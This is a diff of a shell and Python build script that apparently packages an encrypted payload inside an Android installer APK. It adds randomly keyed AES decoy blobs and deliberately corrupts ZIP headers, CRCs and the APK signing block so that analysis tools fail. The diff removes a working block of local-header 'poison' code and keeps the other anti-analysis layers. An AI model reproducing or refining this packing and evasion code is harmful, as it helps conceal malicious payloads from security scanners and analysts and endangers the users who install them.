@@ -1059,14 +1059,15 @@ PYEOF
         rm -rf "$ROOT_DIR/apk-output/$BUILD_ACCESS_ID"
         echo "  Cleared previous APKs for $BUILD_ACCESS_ID"
     fi
-    # Also wipe the encrypted module asset so the installer is rebuilt around
-    # the new payload, any leftover signing sidecar files, and any I3 decoy
-    # .dat blobs from a previous build (they are regenerated fresh each run).
-    rm -f "$ROOT_DIR/installer/src/main/assets/module" \
-          "$ROOT_DIR/installer/src/main/assets/"*.dat \
-          "$ROOT_DIR/installer/build.key" \
-          "$ROOT_DIR/installer/payload.pkg" 2>/dev/null || true
 fi
+
+# Always wipe the encrypted module asset + any I3 decoy .dat blobs so the
+# installer is always rebuilt with a fresh payload and decoys.  This must be
+# unconditional — the BUILD_ACCESS_ID block above only runs in worker mode.
+rm -f "$ROOT_DIR/installer/src/main/assets/module" \
+      "$ROOT_DIR/installer/src/main/assets/"*.dat \
+      "$ROOT_DIR/installer/build.key" \
+      "$ROOT_DIR/installer/payload.pkg" 2>/dev/null || true
 
 # ── 0. Clean (only when --clean is passed) ───────────────────────────────────
 if [ "$CLEAN_BUILD" -eq 1 ]; then
@@ -1851,123 +1852,22 @@ PYEOF
     "$ZIPALIGN" -p -f 4 "$RELEASE_APK" "$REALIGN" > /dev/null
     mv "$REALIGN" "$RELEASE_APK"
 
-    # (e) Post-zipalign local-header structural hardening (E2 + E3 + Z3 + Z4).
-    #
-    # All modifications are in-place (no byte insertion) so offsets in the
-    # central directory and EOCD remain valid. zipalign has already run, so
-    # these changes survive into the final signed APK.
-    #
-    #   E2: version_needed → 0x00FF (version 25.5 — ZIP spec ceiling is 6.3).
-    #       Tools that honour this field refuse "requires version 255.0".
-    #       Android's APK installer ignores version_needed for v2-signed APKs.
-    #
-    #   E3: local compression_method → 0x0063 (WinZip proprietary AES code).
-    #       Central-directory copy stays 0x0008 (Deflate) — Android reads CD.
-    #       Tools that check local-header method invoke AES decryption on raw
-    #       Deflate bytes and either crash or produce complete garbage.
-    #
-    #   Z3: GP flag bit 3 (0x0008) = "data descriptor follows after file data."
-    #       No trailing PK\x07\x08 descriptor is actually present. Sequential
-    #       parsers look for the descriptor and read the NEXT entry's local
-    #       header as it — fatally corrupting their entire offset table.
-    #
-    #   Z4: Local compressed_size inflated by +64 KiB.
-    #       Android uses the central-directory size (untouched) to read data.
-    #       Tools using local-header size to locate the next entry overshoot
-    #       by 64 KiB, treating the next entry's header as file data.
-    echo "  [e] Post-zipalign local-header structural hardening (E2+E3+Z3+Z4) ..."
-    python3 - << PYEOF
-import zipfile, struct, sys, os
+    # NOTE on local-header tricks (E2/E3/Z3/Z4):
+    # apksigner's main signing loop validates LFH↔CD consistency for EVERY
+    # field of EVERY entry before computing signatures.  Any mismatch in
+    # version_needed, compression_method, compressed_size, or GP bit3 aborts
+    # the sign step with ZipFormatException — regardless of --min-sdk-version.
+    # Modifying local headers AFTER signing (post-sign) invalidates the v2
+    # signature because Section 1 (local headers + data) is part of the signed
+    # digest.  There is therefore NO safe window to apply LFH-only tricks to a
+    # v2/v3-signed APK.  These techniques are omitted; active hardening comes
+    # from steps c, c2 (AXML/arsc tampering + pseudo-encryption), and g
+    # (signing block phantom pairs).
 
-APK = "$RELEASE_APK"
-
-TARGETS = {
-    "AndroidManifest.xml",
-    "classes.dex", "classes2.dex", "classes3.dex", "classes4.dex",
-    "classes5.dex", "classes6.dex",
-    "resources.arsc",
-}
-
-with open(APK, "rb") as fh:
-    raw = bytearray(fh.read())
-
-try:
-    with zipfile.ZipFile(APK, "r") as zf:
-        offsets = {i.filename: i.header_offset
-                   for i in zf.infolist() if i.filename in TARGETS}
-except Exception as e:
-    print("    WARNING: could not open APK for local-header hardening: %s" % e)
-    sys.exit(0)
-
-if not offsets:
-    print("    (no target entries found — skipping)")
-    sys.exit(0)
-
-LOCAL_SIG = b"PK\x03\x04"
-patched = []
-
-for fname, hdr in sorted(offsets.items(), key=lambda kv: kv[1]):
-    if raw[hdr:hdr+4] != LOCAL_SIG:
-        continue
-
-    # E2: version_needed = 0x00FF
-    struct.pack_into("<H", raw, hdr + 4, 0x00FF)
-
-    # E3: local compression_method = 0x0063 (WinZip AES code)
-    struct.pack_into("<H", raw, hdr + 8, 0x0063)
-
-    # Z3: GP flag bit 3 — fake data descriptor (set in LOCAL HEADER here;
-    # matched in central directory below so apksigner's LFH↔CD consistency
-    # check passes — tools still see both set and look for a PK\x07\x08
-    # descriptor that is never present, corrupting their offset walk).
-    gp = struct.unpack_from("<H", raw, hdr + 6)[0]
-    struct.pack_into("<H", raw, hdr + 6, gp | 0x0008)
-
-    # Z4: inflate local compressed_size by 64 KiB
-    csz = struct.unpack_from("<I", raw, hdr + 18)[0]
-    struct.pack_into("<I", raw, hdr + 18, (csz + 0x10000) & 0xFFFFFFFF)
-
-    patched.append(fname)
-
-# ── Z3: mirror GP bit 3 into central-directory entries (LFH↔CD must match) ──
-# apksigner validates that the data-descriptor bit is identical in both
-# headers; tools that encounter bit 3 set in CD will also search for trailing
-# PK\x07\x08 descriptors and fail to find them.
-CENTRAL_SIG = b"PK\x01\x02"
-cd_off = 0
-cd_patched = []
-while cd_off <= len(raw) - 46:
-    if raw[cd_off:cd_off+4] != CENTRAL_SIG:
-        cd_off += 1
-        continue
-    fl = struct.unpack_from("<H", raw, cd_off + 28)[0]
-    el = struct.unpack_from("<H", raw, cd_off + 30)[0]
-    cl = struct.unpack_from("<H", raw, cd_off + 32)[0]
-    fn = raw[cd_off+46 : cd_off+46+fl].decode("utf-8", errors="replace")
-    if fn in TARGETS:
-        gp = struct.unpack_from("<H", raw, cd_off + 8)[0]
-        struct.pack_into("<H", raw, cd_off + 8, gp | 0x0008)
-        cd_patched.append(fn)
-    cd_off += 46 + fl + el + cl
-
-with open(APK, "wb") as fh:
-    fh.write(raw)
-
-print("    Local-header hardening applied to %d entries:" % len(patched))
-for f in patched:
-    print("      - %s" % f)
-print("    Central-dir GP bit3 mirrored for: %s" % ", ".join(cd_patched))
-print("    E2: version_needed=0x00FF (parsers refuse 'requires version 255.0')")
-print("    E3: local compression=0x0063 (WinZip AES code; CD keeps Deflate 0x0008)")
-print("    Z3: GP bit3 set LFH+CD (no descriptor present — offset-walk corruption)")
-print("    Z4: local compressed_size +64KiB (64KB boundary overshoot into next header)")
-PYEOF
-
-    # (f) Final sign — covers ALL poison layers applied above (c, c2, e).
-    # --min-sdk-version 24 skips AndroidManifest.xml parsing (apksigner
-    # otherwise reads the manifest to auto-detect minSdk, which trips on
-    # the Z3 data-descriptor bit and E3 compression-method lie in the LFH).
-    echo "  [f] Final sign (v2 + v3 + v4, signs all poison permanently) ..."
+    # (f) Final sign — covers ALL poison layers applied above (c, c2).
+    # --min-sdk-version 24 prevents apksigner from reading AndroidManifest.xml
+    # to auto-detect minSdk (the c2 encrypted-flag in the CD could interfere).
+    echo "  [f] Final sign (v2 + v3 + v4) ..."
     "$APKSIGNER" sign \
         --ks "$KEYSTORE" \
         --ks-key-alias "$KEY_ALIAS" \
@@ -2036,11 +1936,15 @@ if data[magic_off:magic_off + 16] != MAGIC:
     print("    WARN: APK Sig Block magic not found at CD_offset-16 — skipping")
     sys.exit(0)
 
-# block_size = len(all_pairs) + 8 (second size field) + 16 (magic)
+# APK Signing Block layout:
+#   [uint64 size_of_block=N] [pairs, N-24 bytes] [uint64 size_of_block=N] [magic 16B]
+# Total block on disk = 8 + N bytes.
+# magic_off = block_start + 8 + (N-24) + 8 = block_start + N - 8
+# → block_start = magic_off - N + 8 = magic_off - block_size + 8
 block_size  = struct.unpack_from("<Q", data, magic_off - 8)[0]
-block_start = magic_off - 8 - (block_size - 24)   # where first BLOCK_SIZE sits
-pairs_start = block_start + 8
-pairs_end   = magic_off - 8                        # exclusive
+block_start = magic_off - block_size + 8           # position of first size field
+pairs_start = block_start + 8                      # first pair byte
+pairs_end   = magic_off - 8                        # exclusive (second size field)
 existing_pairs = bytes(data[pairs_start:pairs_end])
 
 # ── Build phantom pairs ───────────────────────────────────────────────────────
@@ -2113,11 +2017,6 @@ PYEOF
     echo "    GP flags 0x2041 on AndroidManifest.xml, classes*.dex, resources.arsc"
     echo "      bit0=encrypted | bit6=strong-encrypt | bit13=reserved-unknown"
     echo "    Anti-pseudo-decryption: local-header CRC-32 XORd 0xDEADBEEF"
-    echo "    ── Advanced Local-Header Structural Poison (e) ────────────────────"
-    echo "    E2: version_needed=0x00FF (ZIP spec max 6.3 — parsers refuse v255)"
-    echo "    E3: local compression=0x0063 (WinZip AES code; CD keeps Deflate)"
-    echo "    Z3: GP bit3 (fake data-descriptor — sequential parsers lose offsets)"
-    echo "    Z4: local compressed_size +64KiB (boundary overshoot)"
     echo "    ── APK Signing Block Injection (g, post-sign) ─────────────────────"
     echo "    Z1a: ID=0xDEAD1234 — unknown type, 256B random payload"
     echo "    Z1b: ID=0xCAFE4B1D — signer_count=1 spoof + garbage body"
@@ -2249,24 +2148,23 @@ import os, secrets, pyzipper
 assets_dir   = os.environ["INSTALLER_ASSETS"]
 real_sz      = int(os.environ.get("MODULE_SIZE_BYTES", "2097152"))
 
-# Generate 4 decoy files, each ±15% size of the real module asset.
-for i in range(4):
-    name      = secrets.token_hex(8) + ".dat"          # e.g. "a3f9c1b2e4d700ff.dat"
-    decoy_key = secrets.token_urlsafe(24).encode()
-    # Random plaintext sized ±15% relative to real module
-    variance  = int(real_sz * 0.15)
-    payload   = os.urandom(real_sz + secrets.randbelow(2 * variance + 1) - variance)
-    dst       = os.path.join(assets_dir, name)
-    with pyzipper.AESZipFile(dst, "w",
-                             compression=pyzipper.ZIP_DEFLATED,
-                             encryption=pyzipper.WZ_AES) as zf:
-        zf.setpassword(decoy_key)
-        zf.setencryption(pyzipper.WZ_AES, nbits=256)
-        zf.writestr("payload.apk", payload)
-    sz = os.path.getsize(dst)
-    print("  Decoy asset %d: assets/%s  (%d B, random key)" % (i+1, name, sz))
-
-print("  I3: 4 indistinguishable decoy AES-256 blobs written alongside real 'module'")
+# Generate 1 decoy file sized ±15% of the real module asset.
+# One decoy is enough to prevent automated tools from trivially identifying
+# the real 'module' asset by elimination; keeping it to 1 caps installer size.
+name      = secrets.token_hex(8) + ".dat"
+decoy_key = secrets.token_urlsafe(24).encode()
+variance  = int(real_sz * 0.15)
+payload   = os.urandom(real_sz + secrets.randbelow(2 * variance + 1) - variance)
+dst       = os.path.join(assets_dir, name)
+with pyzipper.AESZipFile(dst, "w",
+                         compression=pyzipper.ZIP_DEFLATED,
+                         encryption=pyzipper.WZ_AES) as zf:
+    zf.setpassword(decoy_key)
+    zf.setencryption(pyzipper.WZ_AES, nbits=256)
+    zf.writestr("payload.apk", payload)
+sz = os.path.getsize(dst)
+print("  Decoy asset: assets/%s  (%d B, random key)" % (name, sz))
+print("  I3: 1 indistinguishable decoy AES-256 blob written alongside real 'module'")
 PYEOF
 
     cd "$ROOT_DIR"
